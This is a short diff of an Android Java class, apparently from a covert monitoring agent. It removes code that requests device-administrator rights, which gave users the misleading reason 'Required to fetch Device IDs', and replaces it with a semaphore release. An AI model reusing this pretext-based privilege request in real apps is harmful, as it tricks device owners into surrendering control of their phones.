@@ -229,20 +229,10 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}			
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
-
-			// startActivityForResult(intent, ACTIVATION_REQUEST);
-			// ServiceMain
-
-			Context context = Status.self().getAppContext();
-
-			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-
-			ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
-			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
-
-			context.startActivity(intent);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (run) release semAdmin");
+			}
+			Status.getSemAdmin().release();
 		}
 
 		try {
